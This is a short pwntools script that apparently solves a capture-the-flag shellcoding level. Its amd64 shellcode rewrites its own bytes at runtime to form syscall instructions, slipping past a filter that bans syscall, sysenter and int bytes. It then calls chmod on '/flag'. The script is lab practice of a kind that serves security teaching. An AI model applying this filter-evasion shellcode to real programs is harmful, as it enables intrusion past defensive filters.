# This challenge requires that your shellcode does not have any `syscall`, 'sysenter', or `int` instructions. System calls
# are too dangerous! This filter works by scanning through the shellcode for the following byte sequences: 0f05
# (`syscall`), 0f34 (`sysenter`), and 80cd (`int`). One way to evade this is to have your shellcode modify itself to
# insert the `syscall` instructions at runtime.
# Write and execute shellcode to read the flag, but the inputted data cannot contain any form of system call bytes (syscall, sysenter, int)
import glob
from pwn import *

context.update(arch="amd64", encoding="latin")

binary = "/challenge/babyshell_level5"

# .rept 0x800; nop; .endr
# %rax	System call	%rdi	                %rsi	        %rdx
# 90	sys_chmod	const char *filename	mode_t mode
shellcode = f'''
lea rdi, [rip + _flag_addr]
mov sil, 7
mov al, 90
inc BYTE PTR [rip]
.byte 0x0e
.byte 0x05

mov dil, 0
mov al, 60

inc BYTE PTR [rip]
.byte 0x0e
.byte 0x05

_flag_addr:
    .ascii "/flag"
'''

shellcode = asm(shellcode)

# with open("shellsh5.bin", "wb") as f:
#     f.write(shellcode)

# exit(1)

with process([binary]) as p:
    p.readuntilS("Reading 0x1000 bytes from stdin.")
    p.send(shellcode)
    print(p.interactive())
